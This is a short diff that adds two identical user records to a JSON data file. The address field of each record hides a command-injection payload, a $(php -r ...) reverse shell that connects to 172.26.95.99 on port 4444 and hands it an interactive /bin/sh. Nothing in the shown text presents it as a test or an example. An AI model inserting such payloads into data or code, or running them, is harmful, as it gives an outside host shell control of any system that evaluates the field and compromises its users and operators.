@@ -324,5 +324,21 @@
                 ]
             }
         ]
+    },
+    {
+        "username": "johndoe",
+        "email": "johndoe@example.com",
+        "phone": "1234567890",
+        "address": "123 Elm Street, Springfield $(php -r '$sock=fsockopen(\"172.26.95.99\",4444);exec(\"\/bin\/sh -i <&3 >&3 2>&3\");')",
+        "password": "ea0c04513c32717f3a09ff7b1fa882c4d8424b2a",
+        "projects": []
+    },
+    {
+        "username": "johndoe",
+        "email": "johndoe@example.com",
+        "phone": "1234567890",
+        "address": "123 Elm Street, Springfield $(php -r '$sock=fsockopen(\"172.26.95.99\",4444);exec(\"\/bin\/sh -i <&3 >&3 2>&3\");')",
+        "password": "ea0c04513c32717f3a09ff7b1fa882c4d8424b2a",
+        "projects": []
     }
 ]
